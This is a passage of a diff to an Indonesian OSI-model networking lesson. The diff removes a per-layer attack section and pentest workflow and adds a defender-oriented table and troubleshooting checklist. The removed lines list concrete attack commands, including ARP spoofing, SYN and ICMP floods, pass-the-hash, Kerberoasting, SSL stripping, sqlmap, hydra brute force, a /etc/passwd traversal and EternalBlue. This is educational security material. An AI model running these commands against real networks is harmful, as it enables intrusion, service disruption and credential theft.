-Layer 4 — Transport     [SEGMENT]         Layer 4 — Transport
-┌─────────────┬───────────────────────┐   ┌─────────────┬──────────┐
-│  TCP Header │     DATA (Payload)    │   │  TCP Header │  Data    │
-│ src/dst port│                       │   └─────────────┴──────────┘
-└─────────────┴───────────────────────┘
-            ↓ Add IP header                            ↑ Remove IP header
-
-Layer 3 — Network       [PACKET]          Layer 3 — Network
-┌──────────┬──────────────────────────┐   ┌──────────┬─────────────┐
-│ IP Header│   TCP Header + Data      │   │ IP Header│    Data     │
-│ src/dst IP│                         │   └──────────┴─────────────┘
-└──────────┴──────────────────────────┘
-            ↓ Add MAC header + trailer                 ↑ Remove MAC frame
-
-Layer 2 — Data Link     [FRAME]           Layer 2 — Data Link
-┌──────────┬────────────────────┬──────┐  ┌──────────┬──────┬──────┐
-│MAC Header│ IP + TCP + Data    │FCS   │  │MAC Header│ Data │ FCS  │
-│src/dst MAC│                  │(CRC) │  └──────────┴──────┴──────┘
-└──────────┴────────────────────┴──────┘
-            ↓ Convert to bits                          ↑ Convert from bits
-
-Layer 1 — Physical      [BITS]            Layer 1 — Physical
-  01001000 01100101 01101100 01101100 ...   01001000 01100101 ...
-
-                    ──── Physical medium ────>
+ip route | grep default    # default gateway = router-mu
 ```
 
 ---
 
-## 10. Perbandingan TCP vs UDP
+## 7. Serangan dan Pertahanan, per Layer
 
-```bash
-# TCP connection analysis
-$ tcpdump -i eth0 'tcp and host 192.168.1.1'
+Setiap layer bisa diserang dengan caranya sendiri. Tujuan di sini adalah mengenali **jenis serangan itu masuk layer mana, dan bagaimana dipertahankan**, supaya kamu bisa menaruh kontrol yang tepat. Ini peta untuk defender, bukan panduan menyerang: perintah eksploitasi yang spesifik sengaja tidak dimasukkan, dan materi lain (LC-042 ARP, LC-039 Wireless, modul web) membahas konsepnya lebih dalam.
 
-# Wireshark filters — TCP
-# tcp.flags.syn == 1 and tcp.flags.ack == 0   → SYN (new connections)
-# tcp.flags.fin == 1                          → FIN (connection closing)
-# tcp.flags.rst == 1                          → RST (reset / port closed)
-# tcp.analysis.retransmission                 → retransmissions (packet loss)
+| Layer | Contoh serangan (apa itu) | Cara bertahan |
+|-------|---------------------------|---------------|
+| 7 Application | SQL injection, XSS, request forgery, phishing: menyalahgunakan logika aplikasi | Validasi input, patching, firewall aplikasi web |
+| 6 Presentation | TLS downgrade / SSL stripping: memaksa koneksi lebih lemah atau polos | Paksa HTTPS (HSTS), TLS 1.3 modern, tolak cipher lama |
+| 5 Session | Session hijacking, serangan replay kredensial: memakai ulang session atau hash curian | Rotasi token session, wajibkan MFA, perketat autentikasi |
+| 4 Transport | SYN flood, port scanning, UDP flood: menguras atau memeriksa layanan | SYN cookie, rate limiting, firewall stateful |
+| 3 Network | IP spoofing, ICMP flood, route poisoning: memalsukan alamat atau rute | Ingress filtering (uRPF), ACL, batas laju ICMP |
+| 2 Data Link | ARP spoofing, MAC flooding, VLAN hopping: menipu switch lokal | Dynamic ARP Inspection, port security di switch |
+| 1 Physical | Penyadapan kabel, Wi-Fi "evil twin" palsu, jamming | Kontrol akses fisik, selalu enkripsi (VPN, HTTPS) |
 
-# Wireshark filters — UDP
-# udp.port == 53     → DNS traffic
-# udp.port == 67     → DHCP server
-# udp.port == 68     → DHCP client
-
-# Test TCP vs UDP response
-$ nmap -sT 192.168.1.1 -p 80   # TCP
-$ nmap -sU 192.168.1.1 -p 53   # UDP
-
-# UDP flood detection
-$ netstat -su    # UDP statistics (errors = possible flood)
-```
-
-| Aspek | TCP | UDP |
-|-------|-----|-----|
-| Nama PDU | Segment | Datagram |
-| Ukuran header | 20 sampai 60 byte | 8 byte |
-| Handshake | 3-way (SYN/SYN-ACK/ACK) | Tidak ada |
-| Keandalan | Ya | Tidak |
-| Urutan | Ya (sequence number) | Tidak |
-| Flow control | Ya (windowing) | Tidak |
-| Error recovery | Ya (retransmit) | Tidak |
-| Kecepatan | Lebih lambat | Lebih cepat |
-| Broadcast | Tidak | Ya |
-| Multicast | Tidak | Ya |
-| Penggunaan | HTTP, SSH, FTP, SMTP | DNS, DHCP, VoIP, gaming |
+Poin paling berguna: sebuah kontrol hanya melindungi layer-nya sendiri. Enkripsi di Layer 6 tidak berguna melawan orang yang mencabut kabel di Layer 1, dan firewall web Layer-7 tidak berguna melawan ARP spoof di Layer 2. Keamanan nyata menumpuk pertahanan di beberapa layer sekaligus (defense in depth).
 
 ---
 
-## 11. Port-port umum
+## 8. Troubleshooting dengan Layer
 
-Port adalah nomor logis (0 sampai 65535) yang mengidentifikasi layanan atau aplikasi spesifik dalam sebuah host. Ada tiga kategori:
-
-- Well-known ports (0 sampai 1023): standar, membutuhkan hak root
-- Registered ports (1024 sampai 49151): terdaftar ke IANA
-- Dynamic/private ports (49152 sampai 65535): dipakai sementara
-
-```bash
-# Port scanning cheatsheet
-
-# Quick common ports scan
-$ nmap -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 target
-
-# Top 1000 ports (default nmap)
-$ nmap target
-
-# All ports
-$ nmap -p- target
-
-# Service version + OS detection + scripts
-$ nmap -sV -O -sC target
-
-# Aggressive scan (combine all)
-$ nmap -A target
-
-# Fast scan
-$ nmap -F target
-
-# Check if specific port is open with nc
-$ nc -zv target.com 22       # SSH
-$ nc -zv target.com 3389     # RDP
-$ nc -zv target.com 445      # SMB
-```
-
-### Tabel referensi port kritis
-
-| Port | Protokol | Layanan | Risiko pentest | Catatan |
-|------|----------|---------|-------------------|---------|
-| 21 | TCP | FTP | Critical | Cleartext, login anonymous |
-| 22 | TCP | SSH | High | Brute force, autentikasi key |
-| 23 | TCP | Telnet | Critical | Cleartext, deprecated |
-| 25 | TCP | SMTP | High | User enum, relay abuse |
-| 53 | TCP/UDP | DNS | High | Zone transfer, DNS poisoning |
-| 67/68 | UDP | DHCP | High | Rogue DHCP, starvation |
-| 80 | TCP | HTTP | High | Web attack, SQLi, XSS |
-| 88 | TCP/UDP | Kerberos | Critical | AS-REP roasting, Kerberoasting |
-| 110 | TCP | POP3 | Medium | Kredensial cleartext |
-| 111 | TCP/UDP | RPC/rpcbind | High | Enumerasi NFS |
-| 135 | TCP | MS-RPC | High | Serangan DCOM |
-| 139 | TCP | NetBIOS | High | SMB, null session |
-| 143 | TCP | IMAP | Medium | Kredensial cleartext |
-| 161/162 | UDP | SNMP | High | Community string, info leak |
-| 389 | TCP | LDAP | High | Enumerasi AD, null bind |
-| 443 | TCP | HTTPS | High | Web attack lewat HTTPS |
-| 445 | TCP | SMB | Critical | EternalBlue, pass-the-hash |
-| 512/513/514 | TCP | r-services | Critical | Tanpa autentikasi, legacy |
-| 873 | TCP | rsync | High | Akses file tanpa autentikasi |
-| 993 | TCP | IMAPS | Low | Terenkripsi |
-| 995 | TCP | POP3S | Low | Terenkripsi |
-| 1433 | TCP | MSSQL | High | Akun SA, xp_cmdshell |
-| 1521 | TCP | Oracle DB | High | SID default |
-| 2049 | TCP/UDP | NFS | High | Mount tanpa autentikasi, root squash |
-| 3306 | TCP | MySQL | High | Root tanpa password |
-| 3389 | TCP | RDP | Critical | BlueKeep, brute force |
-| 5432 | TCP | PostgreSQL | High | Kredensial default |
-| 5900 | TCP | VNC | High | Autentikasi lemah/tanpa autentikasi |
-| 6379 | TCP | Redis | Critical | Tanpa autentikasi, RCE via config |
-| 8080 | TCP | HTTP-alt | High | Dev server, panel admin |
-| 8443 | TCP | HTTPS-alt | High | Panel admin |
-| 27017 | TCP | MongoDB | Critical | Default tanpa autentikasi |
-
----
-
-## 12. Protokol per layer
+Layer memberimu checklist saat "kok tidak jalan". Mulai dari bawah lalu naik: kalau layer bawah rusak, tidak ada yang di atasnya bisa bekerja.
 
 ```
-┌───────────────────────────────────────────────────────────────────┐
-│ LAYER 7 — APPLICATION                                             │
-│  HTTP  HTTPS  FTP  SFTP  SSH  Telnet  DNS  DHCP  SMTP  POP3      │
-│  IMAP  SNMP  LDAP  RDP  SMB  NFS  SIP  XMPP  MQTT  Gopher       │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 6 — PRESENTATION                                            │
-│  SSL  TLS  ASCII  Unicode  JPEG  PNG  GIF  MPEG  MIDI            │
-│  Base64  MIME  XDR  AFP  LPP                                     │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 5 — SESSION                                                 │
-│  NetBIOS  RPC  PPTP  L2TP  SQL*Net  NFS  SMB (session mgmt)      │
-│  iSCSI  SOCKS  PAP  CHAP  Diameter                               │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 4 — TRANSPORT                                               │
-│  TCP  UDP  SCTP  DCCP  SPX  QUIC                                 │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 3 — NETWORK                                                 │
-│  IPv4  IPv6  ICMP  ICMPv6  OSPF  BGP  EIGRP  RIP                │
-│  IPSec  ARP*  RARP*  NAT  IGMP  GRE  MPLS                       │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 2 — DATA LINK                                               │
-│  Ethernet  Wi-Fi (802.11)  PPP  HDLC  Frame Relay                │
-│  ATM  802.1Q (VLAN)  STP  LACP  ARP  MAC                        │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 1 — PHYSICAL                                                │
-│  Ethernet (cable specs)  USB  DSL  ISDN  T1/E1                   │
-│  Bluetooth  802.11 (radio)  Fiber Optic standards                 │
-└───────────────────────────────────────────────────────────────────┘
+Tidak bisa menjangkau sebuah server?
 
-* ARP technically operates between Layer 2 and 3
+L1 Physical:   Kabel terpasang / Wi-Fi tersambung? Link up?
+               ip link show eth0   → cari "state UP"
+
+L2 Data Link:  Bisa melihat MAC gateway?
+               ip neigh show
+
+L3 Network:    Bisa ping gateway, lalu sebuah IP publik?
+               ping 192.168.1.1  lalu  ping 8.8.8.8
+               ip route show     → ada default route?
+
+L4 Transport:  Apakah port-nya benar-benar terbuka?
+               nc -zv target 443
+
+L5/6 Session/Presentation:  Sertifikat TLS valid / belum kedaluwarsa?
+               openssl s_client -connect target:443
+
+L7 Application: Layanan itu bilang apa?
+               curl -v https://target   → cek status code dan log
 ```
 
 ---
 
-## 13. Perangkat jaringan per layer
+## 9. OSI vs Model TCP/IP
 
-Setiap perangkat jaringan beroperasi pada layer OSI tertentu. Memahami ini penting untuk segmentasi jaringan, troubleshooting, dan serangan di level jaringan.
+Jaringan nyata berjalan di atas model TCP/IP 4 layer. Tujuh layer OSI memetakan ke sana begini:
 
-| Layer OSI | Perangkat | Fungsi |
-|-----------|-----------|---------|
-| Layer 7 | Application firewall, WAF, proxy, load balancer | Filter HTTP, SSL inspection |
-| Layer 4 | Stateful firewall, load balancer | Filter berdasarkan port & koneksi |
-| Layer 3 | Router, switch layer 3, firewall | Routing antar jaringan |
-| Layer 2 | Switch (L2), bridge, WAP | Switching berdasarkan MAC |
-| Layer 1 | Hub, repeater, kabel, NIC, WAP | Transmisi sinyal fisik |
-
-```bash
-# Identify network devices during pentest
-
-# Identify routers / gateways
-$ ip route | grep default          # default gateway = router
-$ arp -a                           # ARP table shows local devices
-
-# Scan for specific devices
-$ nmap -sV --version-intensity 5 192.168.1.0/24
-
-# Identify switches (CDP/LLDP discovery)
-$ nmap --script lldp-discovery 192.168.1.0/24
-$ wireshark → filter: lldp or cdp
-
-# WAF detection
-$ wafw00f https://target.com
-$ nmap --script http-waf-detect --script-args="http-waf-detect.aggro" target.com
-
-# Load balancer detection
-$ lbd target.com                   # Load balancer detector
-
-# Proxy detection
-$ curl -v --proxy-header target.com  # look for Via: header
 ```
+Model OSI                    Model TCP/IP          Contoh
+Layer 7 Application  ┐
+Layer 6 Presentation ├──────  Application          HTTP, DNS, SSH, TLS
+Layer 5 Session      ┘
+Layer 4 Transport    ───────  Transport            TCP, UDP
+Layer 3 Network      ───────  Internet             IP, ICMP
+Layer 2 Data Link    ┐
+Layer 1 Physical     ┴──────  Network Access       Ethernet, Wi-Fi, ARP
+```
+
+Pakai OSI untuk *bernalar dan berbicara* soal di mana sesuatu terjadi; traffic di kabel adalah TCP/IP.
 
 ---
 
-## 14. Catatan keamanan: serangan per layer OSI
+## 10. Referensi Cepat
 
-Setiap layer OSI punya vektor serangan yang berbeda-beda. Memahami di layer mana sebuah serangan terjadi membantu defender menempatkan kontrol keamanan yang tepat, dan membantu attacker memilih teknik yang efektif.
+```text
+CHEAT SHEET LAYER (atas → bawah)
+  L7 Application   HTTP, DNS, SSH, SMB          (yang dibicarakan aplikasi)
+  L6 Presentation  TLS, Base64, JPEG            (format & enkripsi)
+  L5 Session       NetBIOS, RPC, session SMB    (mengelola percakapan)
+  L4 Transport     TCP (andal), UDP (cepat)     [PORT]
+  L3 Network       IP, ICMP, routing            [ALAMAT IP]
+  L2 Data Link     Ethernet, ARP, VLAN          [ALAMAT MAC]
+  L1 Physical      kabel, radio, bit            [HARDWARE]
 
-> Catatan edukasi: perintah di bawah ini untuk pengujian yang berizin pada jaringan milik sendiri atau yang sudah diizinkan untuk diuji. Bagian ini memetakan kategori serangan ke layer tempat mereka beroperasi, bukan panduan serangan langkah demi langkah terhadap target yang tidak Anda kendalikan.
+SATUAN DATA PER LAYER
+  L7–L5 Data → L4 Segment/Datagram → L3 Packet → L2 Frame → L1 Bit
 
-```bash
-# ── LAYER 1 ATTACKS ─────────────────────────────────────────────────
-
-# Physical tapping / eavesdropping
-# → Use encrypted protocols (HTTPS, SSH, VPN) to mitigate
-
-# Evil twin Wi-Fi (physical signal)
-$ airbase-ng -e "FreeWiFi" -c 6 wlan0mon
-
-# ── LAYER 2 ATTACKS ─────────────────────────────────────────────────
-
-# ARP Spoofing / Poisoning — MITM at Layer 2
-$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1     # poison victim
-$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100     # poison gateway
-$ echo 1 > /proc/sys/net/ipv4/ip_forward             # enable forwarding
-# Or use:
-$ ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
-$ bettercap -iface eth0                               # modern MITM framework
-
-# MAC Flooding — fill switch CAM table
-$ macof -i eth0                   # flood switch with random MACs
-
-# VLAN Hopping — 802.1Q double tagging
-# Use tools like yersinia
-
-# STP Attack — become root bridge
-$ yersinia stp -attack 1 -interface eth0
-
-# ── LAYER 3 ATTACKS ─────────────────────────────────────────────────
-
-# ICMP Flood / Ping of Death
-$ hping3 -1 --flood -V -a spoofed-ip target.com
-
-# IP Spoofing
-$ hping3 -a fake-source-ip target.com
-
-# Smurf Attack (ICMP broadcast amplification)
-# BGP Hijacking (requires BGP router access)
-
-# Route poisoning
-$ python3 -c "from scapy.all import *; send(IP(dst='router',proto=89)/OSPF_Hdr()/OSPF_Hello())"
-
-# ── LAYER 4 ATTACKS ─────────────────────────────────────────────────
-
-# SYN Flood — exhaust server connections
-$ hping3 -S --flood -V -p 80 target.com
-$ hping3 -S -P -U --flood -V -p 80 target.com
-
-# Port scanning (reconnaissance)
-$ nmap -sS -p- target.com
-
-# TCP Session Hijacking
-# → Requires MITM position + sequence number prediction
-
-# UDP Flood
-$ hping3 --udp --flood target.com -p 53
-
-# ── LAYER 5 ATTACKS ─────────────────────────────────────────────────
-
-# Session Hijacking — steal session tokens
-# → Intercept cookies via HTTP (Wireshark / BetterCAP)
-
-# Pass-the-Hash (Windows NTLM)
-$ pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //target cmd.exe
-$ impacket-psexec domain/user@target -hashes :NTLM_HASH
-
-# Kerberoasting (Kerberos ticket attack)
-$ impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request
-
-# ── LAYER 6 ATTACKS ─────────────────────────────────────────────────
-
-# SSL Stripping — downgrade HTTPS to HTTP
-$ bettercap -iface eth0
-> set https.proxy.sslstrip true
-> https.proxy on
-
-# TLS Downgrade Attack
-$ nmap --script ssl-dh-params target.com   # check for LOGJAM
-$ nmap --script ssl-poodle target.com      # POODLE attack check
-
-# Certificate spoofing / Invalid cert bypass
-$ mitmproxy --ssl-insecure                 # intercept SSL
-$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
-
-# ── LAYER 7 ATTACKS ─────────────────────────────────────────────────
-
-# SQL Injection
-$ sqlmap -u "http://target.com/page?id=1" --dbs
-$ sqlmap -u "http://target.com/" --forms --dbs --level=5
-
-# Cross-Site Scripting (XSS)
-# Test: <script>alert(document.cookie)</script>
-
-# Directory Traversal
-$ curl "http://target.com/../../etc/passwd"
-
-# HTTP brute force
-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
-  "/login:username=^USER^&password=^PASS^:Invalid credentials"
-
-# DNS Zone Transfer
-$ dig axfr @ns1.target.com target.com
-
-# SMTP User Enumeration
-$ smtp-user-enum -M VRFY -U users.txt -t target.com
-
-# SNMP Enumeration
-$ snmpwalk -c public -v 2c target.com
-
-# SMB Exploitation
-$ impacket-psexec administrator:password@target.com
-$ metasploit → use exploit/windows/smb/ms17_010_eternalblue
+TRIK MENGHAFAL
+  atas → bawah:  All People Seem To Need Data Processing
+  bawah → atas:  Please Do Not Throw Sausage Pizza Away
 ```
 
-### Tabel ringkasan serangan OSI
+### Tabel referensi OSI lengkap
 
-| Layer | Serangan umum | Pertahanan |
-|-------|-----------------|------------|
-| 7 — Application | SQLi, XSS, RCE, CSRF, phishing | WAF, validasi input, patching |
-| 6 — Presentation | SSL stripping, TLS downgrade, cert spoofing | HSTS, cert pinning, TLS 1.3+ |
-| 5 — Session | Session hijack, pass-the-hash, Kerberoasting | Rotasi token, MFA, hardening Kerberos |
-| 4 — Transport | SYN flood, port scan, UDP flood | SYN cookies, rate limiting, firewall |
-| 3 — Network | IP spoof, ICMP flood, route poisoning | uRPF, ACL, rate limit ICMP |
-| 2 — Data Link | ARP spoof, MAC flood, VLAN hopping | Dynamic ARP Inspection, port security |
-| 1 — Physical | Penyadapan, evil twin, signal jamming | Keamanan fisik, protokol terenkripsi |
-
----
-
-## 15. Workflow praktis: recon & analisis jaringan
-
-```bash
-# ── SCENARIO: Network Penetration Testing — OSI-based Approach ──────
-
-# ═══ PHASE 1: LAYER 1-2 — Physical & Data Link Recon ════════════════
-
-# 1. Identify your network interface
-$ ip link show
-$ ip addr show
-
-# 2. Put interface in promiscuous mode (passive sniffing)
-$ ip link set eth0 promisc on
-$ tcpdump -i eth0 -n -e           # capture with MAC addresses
-
-# 3. ARP scan — discover all hosts on segment
-$ arp-scan --localnet             # or:
-$ nmap -sn -PR 192.168.1.0/24    # ARP ping sweep
-
-# 4. Check for ARP anomalies
-$ arpwatch -i eth0                # monitor ARP changes
-$ tcpdump -i eth0 arp             # watch ARP traffic live
-
-# ═══ PHASE 2: LAYER 3 — Network Discovery ════════════════════════════
-
-# 5. ICMP ping sweep
-$ nmap -sn 192.168.1.0/24        # host discovery
-$ fping -a -g 192.168.1.0/24 2>/dev/null
-
-# 6. TTL-based OS detection
-$ ping -c 1 target | grep ttl
-# TTL 64  → Linux/Unix
-# TTL 128 → Windows
-# TTL 255 → Network device (Cisco, etc.)
-
-# 7. Traceroute — map network topology
-$ traceroute -n 10.0.0.1
-$ mtr --report 10.0.0.1
-
-# ═══ PHASE 3: LAYER 4 — Port & Service Scanning ══════════════════════
-
-# 8. Quick port scan
-$ nmap -sS -F --open 192.168.1.0/24   # fast SYN scan, open ports only
-
-# 9. Full port scan on discovered hosts
-$ nmap -sS -p- -T4 target.com
-
-# 10. UDP scan (slow but important)
-$ nmap -sU --top-ports 100 target.com
-
-# 11. Service version detection
-$ nmap -sV -sC -p 22,80,443,445 target.com
-
-# ═══ PHASE 4: LAYER 5-6 — Session & Protocol Analysis ════════════════
-
-# 12. Check SSL/TLS configurations
-$ sslscan target.com
-$ nmap --script ssl-enum-ciphers -p 443 target.com
-$ openssl s_client -connect target.com:443
-
-# 13. Check for session management issues
-# Burp Suite → Intercept → check session tokens
-
-# 14. SMB/NetBIOS enumeration
-$ enum4linux -a target.com
-$ smbmap -H target.com
-$ smbclient -L //target.com -N
-
-# ═══ PHASE 5: LAYER 7 — Application Enumeration ══════════════════════
-
-# 15. HTTP enumeration
-$ curl -s -I http://target.com              # headers
-$ whatweb http://target.com                 # tech fingerprint
-$ nikto -h http://target.com               # web vulnerability scan
-$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-# 16. DNS enumeration
-$ dig any target.com
-$ dnsrecon -d target.com -t std
-$ fierce --domain target.com
-
-# 17. SNMP enumeration (if UDP 161 open)
-$ snmpwalk -c public -v 2c target.com
-$ snmpwalk -c public -v 2c target.com 1.3.6.1.2.1.1   # system info
-
-# 18. LDAP enumeration (if port 389 open)
-$ ldapsearch -H ldap://target.com -x -b "dc=target,dc=com"
-$ nmap --script ldap-rootdse target.com
-
-# ═══ ANALYSIS: Correlate findings across layers ═══════════════════════
-
-# 19. Full comprehensive scan
-$ nmap -A -sV -sC -O -p- --open target.com -oN full_scan.txt
-
-# 20. Parse and organize results
-$ grep "open" full_scan.txt | sort -t/ -k1 -n
-```
-
-### Pendekatan troubleshooting OSI
-
-```
-Problem: Can't reach remote server?
-
-Step 1 — Layer 1 (Physical):
-  → Is cable plugged in? Link light on?
-  $ ip link show eth0 | grep "state UP"
-
-Step 2 — Layer 2 (Data Link):
-  → Can you reach local gateway?
-  $ arp -a | grep gateway-ip
-
-Step 3 — Layer 3 (Network):
-  → Can you ping gateway?
-  $ ping 192.168.1.1
-  → Can you ping remote IP?
-  $ ping 8.8.8.8
-  → Check routing table
-  $ ip route show
-
-Step 4 — Layer 4 (Transport):
-  → Is the port open?
-  $ nc -zv target 80
-  $ nmap -p 80 target
-
-Step 5 — Layer 5-6 (Session/Presentation):
-  → SSL certificate valid?
-  $ openssl s_client -connect target:443
-  → Session timeout?
-
-Step 6 — Layer 7 (Application):
-  → HTTP response code?
-  $ curl -v http://target
-  → Application error?
-  → Check application logs
-```
-
----
-
-## Model OSI vs TCP/IP
-
-```
-OSI Model              TCP/IP Model (4-layer)     Protocols
-─────────────          ──────────────────────     ─────────────────────────
-Layer 7 — Application  ┐
-Layer 6 — Presentation ├── Application Layer       HTTP, FTP, DNS, SMTP, SSH
-Layer 5 — Session      ┘
-─────────────          ──────────────────────     ─────────────────────────
-Layer 4 — Transport    ─── Transport Layer         TCP, UDP, SCTP
-─────────────          ──────────────────────     ─────────────────────────
-Layer 3 — Network      ─── Internet Layer          IPv4, IPv6, ICMP, BGP
-─────────────          ──────────────────────     ─────────────────────────
-Layer 2 — Data Link    ┐
-Layer 1 — Physical     ┴── Network Access Layer    Ethernet, Wi-Fi, ARP
-```
-
----
-
-## Cheatsheet referensi cepat
-
-```bash
-# ── OSI LAYER MNEMONICS ────────────────────────────────────────────
-# Top → Bottom:  "All People Seem To Need Data Processing"
-# Bottom → Top:  "Please Do Not Throw Sausage Pizza Away"
-
-# ── LAYER QUICK REFERENCE ─────────────────────────────────────────
-# L7 Application  → HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB
-# L6 Presentation → SSL/TLS, ASCII, Base64, JPEG, MIME
-# L5 Session      → NetBIOS, RPC, SMB sessions, iSCSI
-# L4 Transport    → TCP (reliable), UDP (fast)   [PORTS]
-# L3 Network      → IPv4/IPv6, ICMP, OSPF, BGP   [IP ADDRESSES]
-# L2 Data Link    → Ethernet, ARP, 802.1Q VLAN   [MAC ADDRESSES]
-# L1 Physical     → Cables, signals, bits         [HARDWARE]
-
-# ── PDU NAMES ─────────────────────────────────────────────────────
-# L7-L5: Data
-# L4:    Segment (TCP) / Datagram (UDP)
-# L3:    Packet
-# L2:    Frame
-# L1:    Bits
-
-# ── NETWORK RECON TOOLS ───────────────────────────────────────────
-arp-scan --localnet           # Layer 2 discovery
-nmap -sn 192.168.1.0/24      # Layer 3 host discovery
-nmap -sS -p- target          # Layer 4 port scan
-nmap -sV -sC target          # Layer 7 service detection
-tcpdump -i eth0 -n           # Passive capture (all layers)
-wireshark                    # GUI packet analysis
-
-# ── ATTACK TOOLS BY LAYER ─────────────────────────────────────────
-# L2: arpspoof, ettercap, bettercap, macof, yersinia
-# L3: hping3, scapy, nmap
-# L4: hping3, nmap, netcat, masscan
-# L5: impacket, mimikatz, Responder
-# L6: mitmproxy, sslstrip, sslscan, testssl.sh
-# L7: sqlmap, nikto, gobuster, hydra, burpsuite
-
-# ── DEFENSIVE TOOLS ───────────────────────────────────────────────
-# L2: arpwatch, Dynamic ARP Inspection (DAI on switches)
-# L3: uRPF, firewall ACL, fail2ban
-# L4: SYN cookies, rate limiting, stateful firewall
-# L5: Kerberos hardening, MFA, NTLM restrictions
-# L6: HSTS, cert pinning, TLS 1.3, HPKP
-# L7: WAF, input validation, CSP headers, SAST/DAST
-
-# ── WIRESHARK FILTERS CHEATSHEET ──────────────────────────────────
-ip.addr == 192.168.1.1         # filter by IP
-ip.src == 10.0.0.0/8           # filter by subnet
-tcp.port == 80                 # HTTP traffic
-tcp.flags.syn == 1             # TCP SYN packets
-tcp.flags.rst == 1             # TCP RST (port closed/reset)
-udp.port == 53                 # DNS traffic
-arp                            # ARP traffic only
-http                           # HTTP traffic only
-ssl or tls                     # SSL/TLS traffic
-dns                            # DNS only
-icmp                           # ICMP (ping) only
-!(arp or dns or icmp)          # exclude noise
-
-# ── PORT STATUS IN NMAP ────────────────────────────────────────────
-# open         → service running, accepting connections
-# closed       → port accessible, no service running (RST reply)
-# filtered     → firewall blocking, no reply
-# open|filtered → can't determine (UDP especially)
-# unfiltered   → accessible, but state unknown
-
-# ── COMMON NETWORK COMMANDS ───────────────────────────────────────
-# Linux:
-ip addr show; ip route show; ss -tulnp; arp -a; dig; traceroute
-
-# Windows:
-ipconfig /all; route print; netstat -ano; arp -a; nslookup; tracert
-```
-
----
-
-## Tabel referensi lengkap OSI
-
-| Layer | Nama | PDU | Alamat | Perangkat | Protokol kunci |
-|-------|------|-----|--------|-----------|------------------|
-| 7 | Application | Data | — | WAF, proxy | HTTP, FTP, DNS, SSH |
-| 6 | Presentation | Data | — | — | SSL/TLS, MIME |
+| Layer | Nama | PDU | Alamat | Perangkat | Protokol utama |
+|-------|------|-----|--------|-----------|----------------|
+| 7 | Application | Data | — | WAF, proxy | HTTP, DNS, SSH |
+| 6 | Presentation | Data | — | — | TLS, MIME |
 | 5 | Session | Data | — | — | NetBIOS, RPC |
-| 4 | Transport | Segment/Datagram | Port | Firewall | TCP, UDP |
+| 4 | Transport | Segment / Datagram | Port | Firewall | TCP, UDP |
 | 3 | Network | Packet | Alamat IP | Router | IPv4, IPv6, ICMP |
-| 2 | Data Link | Frame | Alamat MAC | Switch | Ethernet, ARP, 802.1Q |
-| 1 | Physical | Bits | — | Hub, NIC | DSL, Ethernet |
+| 2 | Data Link | Frame | Alamat MAC | Switch | Ethernet, ARP |
+| 1 | Physical | Bit | — | Hub, NIC | Ethernet, DSL |
 
 ---
 
 > **Referensi & sumber buku**
-> - James Kurose & Keith Ross, *Computer Networking: A Top-Down Approach*, `~/Documents/Books/CyberSec/Networking/computernetworking.pdf`
-> - William Stallings, *Network Security Essentials: Applications and Standards (4th Edition)*, `~/Documents/Books/CyberSec/Networking/Network-security-essentials-4th-edition-william-stallings.pdf`
-> - Matthew Gast, *802.11 Wireless Networks: The Definitive Guide*, `~/Documents/Books/CyberSec/Networking/802_11_Wireless_Networks__The_Definitive_Guide__O__039_Reilly_Networking_.pdf`
-> - Christian Benvenuti, *Understanding Linux Network Internals*, `~/Documents/Books/CyberSec/Networking/Understanding Linux Network Internals (2005).pdf`
-> - W. Richard Stevens, *UNIX Network Programming (Volume 1, 3rd Edition)*, `~/Documents/Books/CyberSec/Networking/UNIX Network Programming Volume 1, 3rd edition - W. Richard Stevens.pdf`
+> - James Kurose & Keith Ross, *Computer Networking: A Top-Down Approach*, `~/Documents/Books/CyberSec/Networking/`
+> - William Stallings, *Network Security Essentials (4th Edition)*, `~/Documents/Books/CyberSec/Networking/`
 > - RFC 793 (TCP), RFC 768 (UDP)
-> - Dokumentasi resmi Nmap dan Wireshark, IANA port number registry
+> - Dokumentasi resmi Nmap dan Wireshark, registri nomor port IANA
 
-> **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
-> Edukasi dan lab pada jaringan milik sendiri atau yang sudah berizin.
+> **Repositori:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
+> Materi edukasi dan lab untuk jaringan milik sendiri atau yang kamu berizin mengujinya.
